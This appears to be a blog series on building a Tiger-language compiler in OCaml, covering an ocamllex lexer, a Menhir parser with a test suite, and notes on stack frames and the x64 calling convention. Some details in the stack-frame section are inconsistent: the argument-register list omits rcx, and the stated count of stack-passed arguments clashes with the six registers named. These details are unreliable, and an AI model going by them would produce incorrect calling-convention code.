Conclusion Link to heading By the time I’ve decided to start writing this post I’ve already finished reading 6th chapter and here are some first impressions:
The book is clear and enjoyable to read. Programming assignments and exercises are well thought out Implementing the typechecker (chapter 5) wasn’t easy, for me it took a week to make it work and typecheck correctly every given example program Chapter 6 feels easier (less code to write), but requires some basic knowledge about microprocessor architectures (SPARK, MIPS) I wouldn’t recommend starting with this book to someone with zero compiler design knowledge. But it is definitely a must read for people who already know the basics of compiler construction.
DONE Making of Tiger #2, Lexical Analysis lexingocamllex Link to heading Intro Link to heading We need a way to translate a program written in one (human-friendly) language to another (machine-specific) language. Generally, this work is splitted into 2 parts: analysis and synthesis.
The synthesis-part (back end) is responsible for the code generation and optimizations.
Analysis-part (front end) is responsible for breaking the program apart to understand its structure and meaning. There are 3 commonly used analysis phases:
Lexical – breaking a sequence of characters into sequence of individual tokens (words) Syntax – parsing and checking that we have a valid sequence of tokens Semantic – gathering the program’s meaning, making sure that declarations and statements of program are semantically correct, this usually includes type checking In this post we’ll focus on implementing the lexical analysis phase.
A lexical token is a string with an assigned and identified meaning. This is a unit in a grammar of a programming language.
Example tokens: identifiers, keywords, separators, operators Example non-tokens: white-spaces, tabs, newlines, comments, preprocessor directives, macroses Now, I’m going to skip everything related to finite automata and regular expressions and go straight to the implementation of lexer (lexical analyzer). You can find a good intro to lexing and parsing using ocamllex and menhir in the Read World OCaml book.
Example lexer (morse code) Link to heading We’ll start with the simplest possible example of building a lexer for morse code, the full source code is here.
The dune file for our playground project is going to look like this:
(ocamllex (modules lexer)) (executable (name driver) (libraries core stdio) (preprocess (pps ppx_deriving.show))) (env (dev (flags (:standard -warn-error -A)))) Nothing fancy here. Next one is the driver.ml module, this is our entry point. It simply reads the given file, runs our lexer and displays the resulting S-expression.
open Core open Syntax let rec tokens buf = match Lexer.read buf with | EOF -&gt; [EOF] | tok -&gt; tok::tokens buf let lex_print ch = ch |&gt; Lexing.from_channel |&gt; tokens |&gt; List.iter ~f:(fun e -&gt; Format.printf &#34;%s\n&#34; (show_exp e)) let run filename () = In_channel.with_file filename ~f:lex_print let () = let spec = Command.Spec.(empty &#43;&gt; anon (&#34;filename&#34; %: string)) in run |&gt; Command.basic_spec ~summary:&#34;Run the lexer and display tokens&#34; spec |&gt; Command.run We need a module to describe our tokens, lets call it syntax.ml:
type exp = | SYM of string (* symbol *) | SEP (* separator *) | EOF (* end of file *) [@@deriving show] And the lexer generator itself:
{ open Lexing open Syntax (* Custom exception type for lexer errors *) exception SyntaxError of string } (* Regular expressions: *) (* We use whitespace as a separator, so it is a valid token in our language *) let white = [&#39; &#39; &#39;\t&#39;]&#43; let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34; let sym = [&#39;.&#39; &#39;-&#39;]&#43; (* Lexing rules: *) rule read = parse (* New lines are separators too *) | newline { new_line lexbuf; SEP } | sym { SYM (lexeme lexbuf) } | white { SEP } | _ { raise (SyntaxError (Printf.sprintf &#34;At offset %d: unexpected character.\n&#34; (lexeme_start lexbuf))) } | eof { EOF } Now we can parse the “hello world” sequence written in Morse Code:
.... . .-.. .-.. --- .-- --- .-. .-.. -.. The output will be:
(SYM &#34;....&#34;) SEP (SYM &#34;.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;---&#34;) SEP (SYM &#34;.--&#34;) SEP (SYM &#34;---&#34;) SEP (SYM &#34;.-.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;-..&#34;) EOF Tiger lexer Link to heading Having that basic understanding of how to use the ocamllex to build lexers, we can try to build one for our Tiger language.
The dune file is going to remain the same as in the “morse code” example above. There is a Tiger Language Reference Manual in Appendix A of the book where you can find the information about the tokens we need: identifiers, comments, declarations, data types, etc.
For now, we don’t need to define a real AST data type.
The “mock” syntax.ml module would suffice. type exp = | TYPE | VAR | FUNCTION | BREAK | OF | END | IN | NIL | LET | DO | TO | FOR | WHILE | ELSE | THEN | IF | ARRAY | ASSIGN | OR | AND | GE | GT | LE | LT | NEQ | EQ | DIVIDE | TIMES | MINUS | PLUS | DOT | RBRACE | LBRACE | RBRACK | LBRACK | RPAREN | LPAREN | SEMICOLON | COLON | COMMA | STRING of string | INT of int | ID of string | EOF [@@deriving show] We want to focus on the lexer part. First, we might want to open some commonly used modules and define a custom exception type for lexing errors.
{ open Lexing open Syntax open Base exception SyntaxError of string } Next, we need a few regular expressions:
let digit = [&#39;0&#39;-&#39;9&#39;] (* There are no negative integer literals in Tiger *) let int = digit&#43; let frac = &#39;.&#39; digit* let exp = [&#39;e&#39; &#39;E&#39;] [&#39;-&#39; &#39;&#43;&#39;]? int let float = digit* frac? exp? let white = [&#39; &#39; &#39;\t&#39;]&#43; let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34; According to Appendix A:
An identifier is a sequence of letters, digits and underscores, starting with a letter. Uppercase letters are distinguished from lowercase.
let alphanum = [&#39;a&#39;-&#39;z&#39; &#39;A&#39;-&#39;Z&#39; &#39;0&#39;-&#39;9&#39; &#39;_&#39;] let id = [&#39;a&#39;-&#39;z&#39;] alphanum* Lexing rules.
rule read = parse (* Whitespaces *) | white { read lexbuf } We want to skip the new lines.
| newline { new_line lexbuf; read lexbuf } We have a separate function to read strings (see the implementation below).
| &#39;&#34;&#39; { read_string (Buffer.create 16) lexbuf } Again, according the Appendix A:
A comment may appear between any two tokens. Comments start with /* and end with */ and may be nested.
We’ll have a separate function for reading comments (scroll down to see its code).
| &#34;/*&#34; { read_comment [lexbuf.lex_curr_p] lexbuf } Basic keywords:
| &#34;type&#34; { TYPE } | &#34;var&#34; { VAR } | &#34;function&#34; { FUNCTION } | &#34;break&#34; { BREAK } | &#34;of&#34; { OF } | &#34;end&#34; { END } | &#34;in&#34; { IN } | &#34;nil&#34; { NIL } | &#34;let&#34; { LET } | &#34;array&#34; { ARRAY } We need 4 tokens for loops:
| &#34;do&#34; { DO } | &#34;to&#34; { TO } | &#34;for&#34; { FOR } | &#34;while&#34; { WHILE } Conditionals (if-then-else):
| &#34;else&#34; { ELSE } | &#34;then&#34; { THEN } | &#34;if&#34; { IF } Operators:
(* General *) | &#34;:=&#34; { ASSIGN } (* Logical *) | &#34;|&#34; { OR } | &#34;&amp;&#34; { AND } (* Comparison *) | &#34;&gt;=&#34; { GE } | &#34;&gt;&#34; { GT } | &#34;&lt;=&#34; { LE } | &#34;&lt;&#34; { LT } | &#34;&lt;&gt;&#34; { NEQ } | &#34;=&#34; { EQ } (* Arithmetics *) | &#34;/&#34; { DIVIDE } | &#34;*&#34; { TIMES } | &#34;-&#34; { MINUS } | &#34;&#43;&#34; { PLUS } Separators:
| &#34;.&#34; { DOT } | &#34;{&#34; { LBRACE } | &#34;}&#34; { RBRACE } | &#34;[&#34; { LBRACK } | &#34;]&#34; { RBRACK } | &#34;(&#34; { LPAREN } | &#34;)&#34; { RPAREN } | &#34;;&#34; { SEMICOLON } | &#34;:&#34; { COLON } | &#34;,&#34; { COMMA } Numbers, identifiers, error and EOF handling:
| int { INT (Int.of_string (Lexing.lexeme lexbuf)) } | id { ID (Lexing.lexeme lexbuf) } | _ { raise (SyntaxError (&#34;Unexpected character: &#34; ^ Lexing.lexeme lexbuf)) } | eof { EOF } The rule to match string literals:
and read_string buf = parse (* If we reach the terminating double quote, then * we return the contents of the buffer as a STRING. *) | &#39;&#34;&#39; { STRING (Buffer.contents buf) } (* Handling escape sequences *) | &#39;\\&#39; &#39;\\&#39; { Buffer.add_char buf &#39;\\&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;/&#39; { Buffer.add_char buf &#39;/&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;b&#39; { Buffer.add_char buf &#39;\b&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;f&#39; { Buffer.add_char buf &#39;\012&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;n&#39; { Buffer.add_char buf &#39;\n&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;r&#39; { Buffer.add_char buf &#39;\r&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;t&#39; { Buffer.add_char buf &#39;\t&#39;; read_string buf lexbuf } | [^ &#39;&#34;&#39; &#39;\\&#39;]&#43; { Buffer.add_string buf (Lexing.lexeme lexbuf); read_string buf lexbuf } | _ { raise (SyntaxError (&#34;Illegal string character: &#34; ^ Lexing.lexeme lexbuf)) } | eof { raise (SyntaxError &#34;String is not terminated&#34;) } The rule to match comments (including nested comments), keeping a list of where comments open:
and read_comment opened = parse (* Opening comment *) | &#34;/*&#34; { read_comment (lexbuf.lex_curr_p::opened) lexbuf } (* Closing comment *) | &#34;*/&#34; { match opened with (* No nested opened comments left, continue parsing. *) | _::[] -&gt; read lexbuf (* Continue parsing comment. *) | _ -&gt; read_comment (List.tl_exn opened) lexbuf } | newline { new_line lexbuf; read_comment opened lexbuf } | _ { read_comment opened lexbuf } (* Unexpected end-of-file. Update the current location to * point to the opening token that wasn&#39;t closed and raise an error. *) | eof { lexbuf.lex_curr_p &lt;- List.hd_exn opened; raise (SyntaxError &#34;Unterminated comment&#34;) } Summary Link to heading We’ve learned some new things, like ocamllex, but overall, it wasn’t too hard to follow the book. The full OCaml source code for the second chapter can be found here. In the next part we’re going to write a parser.
DONE Making of Tiger #3, Parsing parsingmenhir Link to heading Intro Link to heading In this chapter we’re going to build a parser for our Tiger language. First, let’s do a quick recap of some important concepts of the theory behind programming language parsers:
Parser generator is the most common type of compiler-compiler’s. It takes some formal grammar (typically it is a context-free grammar in BNF or EBNF form), that defines a syntax of a programming language. Tiger grammar with Menhir Link to heading While reading the current paragraph I highly recommend consulting the Tiger Language Reference Manual that has a precise description (along with a BNF notation) of everything we’re going to define below.
Menhir is an LR(1) parser generator library for OCaml. It integrates with Dune quiet nicely. All we need to do is to add the menhir stanza to our dune file (the one from the previous chapter). So the whole file will look like this:
(menhir (modules parser) (flags (&#34;--dump&#34; &#34;--explain&#34;))) (ocamllex (modules lexer)) (library (name ch3) (inline_tests) (libraries core stdio) (preprocess (pps ppx_inline_test ppx_expect))) (env (dev (flags (:standard -warn-error -A)))) Notice the --dump and --explain switches:
The --dump switch means to write a description of the automaton to the .automaton file. The --explain switch helps us to understand severe conflicts in terms of a grammar (rather than in terms of automaton), enabling it means to write a textual explanation of detected shift-reduce conflicts to the .conflicts file. Here is the example of how it looks. See the conflicts part of the Menhir manual for details.
We’ll use the new syntax for rules (despite the fact that it is considered experimental). First, let’s define some token aliases, priorities and associativity levels. Basically these are the same tokens we used in our lexer.
Base keywords:
%token TYPE &#34;type&#34; %token VAR &#34;var&#34; %token FUNCTION &#34;function&#34; %token BREAK &#34;break&#34; %token OF &#34;of&#34; %token END &#34;end&#34; %token IN &#34;in&#34; %token NIL &#34;nil&#34; (* nil denotes a value belonging to every record type *) %token LET &#34;let&#34; %token ARRAY &#34;array&#34; Loop-related keywords:
%token DO &#34;do&#34; %token TO &#34;to&#34; %token FOR &#34;for&#34; %token WHILE &#34;while&#34; Keywords for conditional expression:
%token IF &#34;if&#34; %token THEN &#34;then&#34; %token ELSE &#34;else&#34; Operator tokens:
(* General *) %token ASSIGN &#34;:=&#34; (* Logical *) %token OR &#34;|&#34; %token AND &#34;&amp;&#34; (* Comparison *) %token GE &#34;&gt;=&#34; %token GT &#34;&gt;&#34; %token LE &#34;&lt;=&#34; %token LT &#34;&lt;&#34; %token NEQ &#34;&lt;&gt;&#34; %token EQ &#34;=&#34; (* Arithmetics *) %token DIVIDE &#34;/&#34; %token TIMES &#34;*&#34; %token PLUS &#34;&#43;&#34; %token MINUS &#34;-&#34; Tokens for separators:
%token DOT &#34;.&#34; %token LBRACE &#34;{&#34; %token RBRACE &#34;}&#34; %token LBRACK &#34;[&#34; %token RBRACK &#34;]&#34; %token LPAREN &#34;(&#34; %token RPAREN &#34;)&#34; %token SEMICOLON &#34;;&#34; %token COLON &#34;:&#34; %token COMMA &#34;,&#34; Strings, numbers, identifiers and the EOF token:
%token &lt;string&gt; STRING &#34;string&#34; %token &lt;int&gt; INT &#34;int&#34; %token &lt;string&gt; ID &#34;id&#34; %token EOF Associativity of operators:
%nonassoc &#34;of&#34; %nonassoc &#34;then&#34; %nonassoc &#34;else&#34; %nonassoc &#34;do&#34; %nonassoc &#34;:=&#34; %left &#34;|&#34; %left &#34;&amp;&#34; %nonassoc &#34;&gt;=&#34; &#34;&gt;&#34; &#34;&lt;=&#34; &#34;&lt;&#34; &#34;&lt;&gt;&#34; &#34;=&#34; %left &#34;&#43;&#34; &#34;-&#34; %left &#34;*&#34; &#34;/&#34; The grammar rules:
%start &lt;unit&gt; main %% let main := ~ = expr; EOF; &lt;&gt; Top-level expression:
let expr := | primitive | &#34;nil&#34; | &#34;break&#34; | create_rec | create_arr | lvalue | assignment | local | conditional | loop | fun_call | unary | binary | seq It might not be obvious from the expr definition, but it also includes a thing called no value (an expression that yields no value). So when looking at the top-level expression and comparing it to the language reference manual, please note that in our grammar no_val := &#34;(&#34; &#34;)&#34; (empty seq).
There are two built-in (predefined) primitive types: int and string. The grammar rule for those is pretty straightforward:
let primitive := | &#34;string&#34;; { () } | &#34;int&#34;; { () } In our language we have only one unary operator – minus:
let unary := &#34;-&#34;; expr But we have two kinds of binary operators: boolean and “logical &#43; arithmetic”, which we’ll simply call bin:
let binary := | bin | boolean Scroll down to see the definitions of bin and boolean.
We have 2 kinds of loops: the while loop and the for loop:
let loop := | while_loop | for_loop let while_loop := &#34;while&#34;; expr; &#34;do&#34;; expr let for_loop := &#34;for&#34;; &#34;id&#34;; &#34;:=&#34;; expr; &#34;to&#34;; expr; &#34;do&#34;; expr Nothing new or unusual. And the conditional expression rule is also quite trivial:
let conditional := | &#34;if&#34;; expr; &#34;then&#34;; expr; &#34;else&#34;; expr | &#34;if&#34;; expr; &#34;then&#34;; expr Syntax for local bindings is going to be exactly like in OCaml or SML:
let local := &#34;let&#34;; decs; &#34;in&#34;; expr_seq; &#34;end&#34; Now, a slightly more complex part – declarations.
As stated in the Tiger language reference manual, a declaration-sequence is a sequence of type, value, and function declarations. No punctuation separates or terminates individual declarations.
In terms of Menhir we can express it like this:
let decs := list(dec); { () } let dec := | ty_dec (* type *) | var_dec (* value *) | fun_dec (* function declaration *) Ok, we need to define a separate rule for each declaration mentioned above.
To declare a data type in the Tiger language we start with the keyword type, after which comes the identifier, the equality token and the type declaration body:
let ty_dec := &#34;type&#34;; &#34;id&#34;; &#34;=&#34;; ty The type declaration could be a record, an array or a type alias (any identifier):
let ty := | braced(ty_fields) (* records *) | &#34;array&#34;; &#34;of&#34;; &#34;id&#34;; { () } (* arrays *) | &#34;id&#34;; { () } let ty_fields := separated_list(&#34;,&#34;, ty_field); { () } let ty_field := &#34;id&#34;; ty_ann As per language reference manual, there are two possible ways to declare a variable: with or without type annotation. The following rule reflects this:
let var_dec := | &#34;var&#34;; &#34;id&#34;; &#34;:=&#34;; expr | &#34;var&#34;; &#34;id&#34;; ty_ann; &#34;:=&#34;; expr The record and array creation rules below are also considered top-level expressions:
let create_rec := &#34;id&#34;; braced(init_rec_fields) let create_arr := &#34;id&#34;; bracketed(expr); &#34;of&#34;; expr let init_rec_fields := separated_list(&#34;,&#34;, init_rec_field); { () } let init_rec_field := &#34;id&#34;; &#34;=&#34;; expr Next, we need a function declaration rule:
let fun_dec := (* procedures doesn&#39;t return values *) | fun_head; &#34;=&#34;; fun_body (* functions return values and the type is specified after the colon *) | fun_head; &#34;:&#34;; &#34;id&#34;; &#34;=&#34;; fun_body let fun_head := &#34;function&#34;; &#34;id&#34;; fun_params let fun_body := expr let fun_params := parenthesized(ty_fields) According to our language spec:
&gt; An l-value is a location, whose value may be read or assigned. &gt; Variables, procedure parameters, fields or records, and elements are all l-values.
let lvalue := (* variable *) | &#34;id&#34;; { () } (* everything else *) | lvalue_t let lvalue_t := (* simple record field *) | &#34;id&#34;; &#34;.&#34;; &#34;id&#34;; { () } (* compound record field *) | lvalue_t; &#34;.&#34;; &#34;id&#34;; { () } (* simple array subscript *) | &#34;id&#34;; bracketed(expr) (* compund array subscript *) | lvalue_t; bracketed(expr) Assignment of an expression to lvalue:
let assignment := lvalue; &#34;:=&#34;; expr Sequence of expressions delimited by semicolon:
let expr_seq := separated_list(&#34;;&#34;, expr); { () } let seq := parenthesized(expr_seq) Function call rule:
let fun_call := &#34;id&#34;; parenthesized(fun_args) let fun_args := separated_list(&#34;,&#34;, expr); { () } Arithmetic, comparison and equality expressions:
let bin := expr; bin_op; expr let bin_op == &#34;&#43;&#34; | &#34;-&#34; | &#34;*&#34; | &#34;/&#34; | &#34;&gt;=&#34; | &#34;&gt;&#34; | &#34;&lt;=&#34; | &#34;&lt;&#34; | &#34;&lt;&gt;&#34; | &#34;=&#34; Boolean expressions:
let boolean := expr; boolean_op; expr let boolean_op == &#34;&amp;&#34; | &#34;|&#34; Helper rule for a type annotation which we used in the var_dec and ty_field above:
let ty_ann := &#34;:&#34;; &#34;id&#34; Menhir allows us to declare functions, so these are three helper functions that we used everywhere else for delimited expressions:
let parenthesized(x) == delimited(&#34;(&#34;, x, &#34;)&#34;) let bracketed(x) == delimited(&#34;[&#34;, x, &#34;]&#34;) let braced(x) == delimited(&#34;{&#34;, x, &#34;}&#34;) Test suite Link to heading In order to iterate on our parser quickly we want to automate the process of testing it against the provided example programs. The most convenient way to do that would be to create a test suite that we could run after every change we make.
Some of the provided example Tiger programs are intentionally broken, so we want to skip those:
let skipped = [&#34;test16.tig&#34;; &#34;test17.tig&#34;; &#34;test19.tig&#34;; &#34;test20.tig&#34;; &#34;test25.tig&#34;; &#34;test45.tig&#34;; &#34;test49.tig&#34;] A couple of helper functions to list the example programs (recursively):
let is_tig_ext filename = let (_, ext) = Filename.split_extension filename in match ext with | Some &#34;tig&#34; -&gt; true | _ -&gt; false let is_tig_file f = Sys.is_file_exn ~follow_symlinks:true f &amp;&amp; is_tig_ext f let rec ls_rec dir = if is_tig_file dir then if not(List.mem skipped (Filename.basename dir) ~equal:(=)) then [dir] else [] else dir |&gt; Sys.ls_dir |&gt; List.concat_map ~f:(fun sub -&gt; ls_rec (Filename.concat dir sub)) Let’s add another helper function to get current position along with a filename as a string. We’ll need it later to output an error location:
let position lexbuf = let pos = lexbuf.lex_curr_p in let col = pos.pos_cnum - pos.pos_bol &#43; 1 in Printf.sprintf &#34;%s:%d:%d&#34; pos.pos_fname pos.pos_lnum col And another two functions to run the parser and print the error details in case of failure:
let parse_with_error lexbuf = try Parser.main Lexer.read lexbuf; assert_bool &#34;Ok&#34; true with | SyntaxError msg -&gt; assert_failure (position lexbuf ^ &#34; : &#34; ^ msg) | Parser.Error -&gt; assert_failure (&#34;Syntax error: &#34; ^ position lexbuf) let parse filename ch = let lexbuf = Lexing.from_channel ch in lexbuf.lex_curr_p &lt;- { lexbuf.lex_curr_p with pos_fname = Filename.basename filename }; parse_with_error lexbuf Here is the function that we’re going to call for each .tig file:
let run_parser filename _ = In_channel.with_file filename ~f:(parse filename) Finally, the test suite is going to look like this:
let suite = &#34;tiger programs&#34; &gt;::: let tests_dir = &#34;../../../book&#34; ^ Filename.dir_sep ^ &#34;testcases&#34; in let tests_path = Filename.(concat parent_dir_name tests_dir) in let tig_files = ls_rec tests_path in (List.map ~f: (fun filename -&gt; Filename.basename filename &gt;:: run_parser filename) tig_files) let () = run_test_tt_main suite The dune file for our test suite project will simply run the testsuite.exe executable:
(executable (name testsuite) (libraries base core ch3 oUnit)) (alias (name runtest) (action (run ./testsuite.exe))) Now it’ll be much easier to work on the parser implementation. Also this test suite might be useful to detect possible regressions if we want to change the parser in the future.
Conclusion Link to heading Of course, I didn’t come up with this grammar right away. I spent almost a week implementing this parser. I started with a simple parser for “straightline programs” and iterated on it until it evolved to the fully functional Tiger-language grammar. And it took some time for me to figure out how to resolve all the shift-reduce conflicts.
Another cool feature of Menhir is its REPL, which might be helpful for debugging. This is especially useful when you already caught a parser error by running the test suite and now you want to try constructing an invalid expression to check your hypothesis. I used this kind of workflow a lot while working on this grammar.
You can run the interpreter like this:
menhir --interpret --interpret-show-cst parser.mly Now you can start typing expressions until you find something that breaks your parser. Note that you can’t use token aliases inside this REPL.
For example, here is how you can test a function declaration:
LET FUNCTION ID LPAREN ID COLON ID RPAREN COLON ID EQ IF ID EQ INT THEN INT ELSE INT TIMES ID LPAREN ID MINUS INT RPAREN IN ID LPAREN INT RPAREN END That’s it for now. The full source code for this chapter is here. Next time we’re going to work on the AST for our Tiger language.
DRAFT Making of Tiger #4, Abstract Syntax ast Link to heading Intro Link to heading TODO Making of Tiger #5, Semantic Analysis type-checking Link to heading Intro Link to heading I really enjoyed working through this chapter, but at the same time implementing the type-checking phase was a bit more difficult than working on AST, parser or lexer from the previous chapters.
DONE Making of Tiger #6, Stack frames stackmemory Link to heading Intro Link to heading In this post we’re going to add support for stack frames. Here I’ve made some notes while reading the chapter 6 to make sure I understand things clearly.
Stack
A stack is a region of memory that grows downward and shrinks upward (like icicles). The top of the stack is it’s lowest memory address. We treat stack as a big array, with a special register – the stack pointer (SP).
The stack grows only at the entry to a function, by the increment large enough to hold all the local variables for that function. The stack shrinks at the exit from the function by the same amount.
Stack frame (SF)
We need a stack frame abstraction because:
Local variables are pushed/popped in large batches on function entry/exit When local variables created they are not always initialized right away After many variables have been pushed, we want to continue accessing variables deep within the stack A stack frame consists of:
Some of local variables (others are kept in CPU registers) Return address (where control should return after completion of the current function) Temporaries and saved registers Outgoing/incoming arguments Another name for a stack frame is a function activation record. Stack frame layout depends on the ISA and the programming language being compiled.
Here is a typical stack frame layout:
: : (higher addresses) : : previous frame | i1 | [FP&#43;8] (2-nd argument) | i2 | [FP&#43;4] (1-st argument) | SL | [FP] (static link) ------------------------------------------------- | l1 | [FP-4] (1-st local variable) | l2 | [FP-8] (2-nd local variable) : : | lk | [FP-k*4] (k-nd local variable) | RA | [FP-k*4-k] (return address) : : | t1 | (1-st temp) temporaries and | t2 | (2-nd temp) saved registers : : | o1 | (1-st outgoing arg) outgoing | o2 | (2-nd outgoing arg) arguments : : | SP | [FP-?] (current stack pointer) ------------------------------------------------- : : next frame : : (lower addresses) Stack pointer (SP)
Always points to the top of the stack (lowest memory address in a stack).
Frame pointer (FP)
A term we use for convenience.
On entry to some function f we allocate a new stack frame (SF) by subtracting the frame size from the SP and the old FP is saved in the stack frame (SF).
Basically, if the frame size is fixed: FP = SP &#43; size(SF).
On function enter:
SF[0...k] = V[0...k] (put local variables in SF) SF[k &#43; 1] = FP (save the current FP in SF) FP = SP (old SP becomes the current FP) On function exit:
SP = FP (copy FP back to SP) FP = SF[k &#43; 1] (fetch back the saved FP) The size of stack frame (SF) is not known until quite late in the compilation process, but we want to know the offsets of function arguments and local variables much earlier. We put args and locals right near the FP at offsets that are known early (temporaries and saved registers are known later).
Registers
We want to use CPU registers as much as possible to make compiled programs run faster. Also we have a limited set of registers available and many functions that use them. We must be able to save and restore them (to/from a stack frame).
We say that a register is caller-save if the caller must save and restore it, otherwhise it is callee-save. Which registers are preserved depends on the machine architecture.
Parameters and returns addresses
In the early days (in 70’s) on most machines function arguments and return addresses were always passed on the stack. On modern machines, for efficiency (to avoid high memory traffic), the first several arguments, result and return address are passed in registers. The rest args are passed in memory.
Why and how usage of registers helps
Suppose f(a, b, c) calls g(x, y, z).
The f receives its args in registers \( r_1, r_2 \) and \( r_3 \), but it must pass the args x, y and z in the same registers \( r_1, r_2 \) and \( r_3 \). So the f should save those registers to its stack frame before calling g and we’re back to the memory traffic problem.
So how the usage of registers saved any time?
Leaf procedures – those that don’t call other procedures. The most procedures called are leafs which need not write their incoming args to memory. And often they don’t need to allocate a stack frame at all. Interprocedural register allocation. A technique used by some optimizing compilers to analyze all the functions in an entire program at once and assign them different registers in which to receive parameters and hold local variables. Sometimes f doesn’t need its args anymore by the time it calls g, so it can just overwrite corresponding registers. Register windows available on some architectures. Each function can allocate a fresh set of registers without memory traffic. How incoming parameters are passed
The first k args \( a_1, \dots, a_k \) are passed in registers and the rest \( a_{k&#43;1} ,\dots, a_n \) are placed at the end of the callers own frame.
If the callee needed to write any of these arguments (including those passed in registers) to memory, it would write them to the very beginning of its own stack frame.
For simplicity we’ll assume that by default everything is passed and kept in registers, except for cases when:
variable is passed by reference variable is accessed by a nested function variable is too big to fit into a single register array variables register holding the variable is needed for some other purpose there are many local variables and temporary values that they won’t all fit in registers Escaping variables
Variable escapes if:
It is passed by reference It is accessed from a nested function Its address is taken (not applicable for Tiger) But when the compiler sees a formal parameter or local variable for the first time it doesn’t yet know whether it escapes and how many registers the calculation will require.
So we must assign some provisional locations (see the alloc_local function) to all formals and locals, and decide later which of them should really go in registers.
Static link (SL)
Block structure – a feature that allow the inner functions use variables declared in outer functions Static link (SL) – a pointer to the function statically enclosing the current one Static links are stored in stack frames.
Example of program with nested functions in Tiger.
type tree = { key: string, left: tree, right: tree } function prettyprint(tree: tree) : string = let var output := &#34;&#34; function write(s: string) = output := concat(output, s) function show(n: int, t: tree) = &lt;--- [2] let function indent(s: string) = ( for i := 1 to n do &lt;--- [5] write(&#34; &#34;); output := concat(output, s); write(&#34;\n&#34;) ) in if t = nil then ident(&#34;.&#34;) &lt;--- [3] else ( indent(t.key); show(n &#43; 1, t.left); &lt;--- [4] show(n &#43; 1, t.right) ) end in show(0, tree); &lt;--- [1] output end prettyprint calls show, passing prettyprint’s own frame pointer (FP) as show’s static link (SL) show stores its static link (SL) into its own stack frame show calls indent, passing its own frame pointer (FP) as indent’s SL show calls show, passing its own static link as SL indent uses the value n from show’s frame, it can find n by using the SL (which points at the stack frame of show) Each call requires a one or more fetches using static links to resolve variables declared in outer functions.
Interface Link to heading Stack frame and calling conventions
Every machine architecture might have a different standard stack frame layout.
Suppose we have a call of the following function g(x1, x2, x3) where the 1-st parameter escapes. Here is an example of how the Frame.mk g [true; false; false] works on three different architecture.
Architecture Formals Pentium [InFrame 8; InFrame 12; InFrame 16] MIPS [InFrame 0; InReg t157; InReg t158] SPARC [InFrame 8; InReg t157; InReg t158] Pentium MIPS SPARC \( SF_{SP&#43;0} \leftarrow FP \) \( SP \leftarrow SP-k \) SAVE \(\ SP \), \( -k \), \(\ SP \) \( FP \leftarrow SP \) \( SF_{SP&#43;k&#43;0} \leftarrow r_2 \) \( SF_{FP&#43;68} \leftarrow i_0 \) \( SP \leftarrow SP-k \) \( t_{157} \leftarrow r_4 \) \( t_{157} \leftarrow i_1 \) \( t_{157} \leftarrow r_5 \) \( t_{158 }\leftarrow i_2 \) \(SF\) – Stack frame memory region \(k\) – Number of formal parameters \(t\) – Temporary location \(r_i\) – MIPS registers \(i_i\) – SPARC registers Thats why we’ll use an abstract interface for stack frames.
Most of PC’s and laptops are based on the x86 and x64 ISA. Mobile devices usually based on the ARM ISA.
x86 – family of (32-bit) ISA based on the Intel 8086 and 8088 microprocessors x64 – a 64-bit version of the x86 ISA supporting larger amounts of virtual and physical memory &#43; additional general-purpose registers x86
Has 8 general-purpose registers: eax, ebx, ecx, edx, ebp, esp, esi, edi 32-bit (4-byte) words x64
Has 16 general-purpose registers: rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8 - r15 64-bit (8-byte) words Lets use the x64 ISA, there are 2 flavours of it:
Microsoft x64 System V AMD64 (which I prefer) According to the System V AMD64 ABI, the first 6 integer arguments are passed in left-to-right order in rdi, rsi, rdx, rcx, r8 and r9 registers, respectively.
Arguments 5 and higher are passed in memory. They are pushed onto the stack in reversed (right-to-left) order.
Helpful links:
System V AMD64 ABI (page 12) Calling conventions (Wikipedia) Calling conventions (OS Dev) Here is our interface for a stack frame:
(** Holds information about formal parameters and local variables allocated in this frame *) type t [@@deriving show] (** Abstract location of a formal parameter (function argument) or a local variable that may be placed in a frame or in a register *) type access [@@deriving show] (** Makes a new frame for a function with the given label and formal parameters *) val mk : Temp.label -&gt; bool list -&gt; t (** Extracts a list of accesses denoting the locations where the formal parameters will be kept at runtime, as seen from inside the callee *) val formals : t -&gt; access list (** Allocates a new local variable in the given frame or in a register. The boolean argument specifies whether the new variable escapes and needs to go in the frame. Returns &#34;in-memory&#34; access with an offset from the frame pointer or &#34;in-register&#34; access in case if it can be allocated in a register *) val alloc_local : t -&gt; bool -&gt; access To make a new frame for some function f we’ll call Frame.mk label formals, where:
label: Temp.label – static memory address of the f function (that is yet to be determined) formals: bool list – true for each parameter that escapes and false for each that doesn’t The stack frame should contain information about formal parameters and local variables allocated:
type t = { (* label at which the function&#39;s machine code begins *) label: Temp.label; (* locations of all the formals *) formals: access list; (* number of locals allocated so far *) locals: int ref; (* instructions required to implement the &#34;view shift&#34; *) instrs: Instruction.t list; } [@@deriving show] We don’t want to implement the view shift right now, so the Instruction.t is defined like this:
type t = unit [@@deriving show] ABI
Lets add some constants for System V ADM64 ABI to the Frame module. We’ll need them later.
(* word size in bytes *) let word_size = 64 / 8 (* = 8 bytes *) (* special registers *) let fp = &#34;rbp&#34; (* frame pointer *) let sp = &#34;rsp&#34; (* stack pointer *) (* x64 &#34;parameter&#34;-registers *) let rdi = &#34;rdi&#34; let rsi = &#34;rsi&#34; let rdx = &#34;rdx&#34; let rcx = &#34;rcx&#34; let	r8 = &#34;r8&#34; let r9 = &#34;r9&#34; let arg_regs = [rdi; rsi; rdx; r8; r9] (* other x64 registers *) let rbx = &#34;rbx&#34; let r10 = &#34;r10&#34; let r11 = &#34;r11&#34; let r12 = &#34;r12&#34; let r13 = &#34;r13&#34; let r14 = &#34;r14&#34; let r15 = &#34;r15&#34; (* registers that are preserved by the caller *) let caller_regs = [r10; r11] (* registers that are preserved by the callee *) let callee_regs = [rbx; r12; r13; r14; r15] Access
The access data type describes location of a formal parameter or a local variable that may be placed in a frame or in a register:
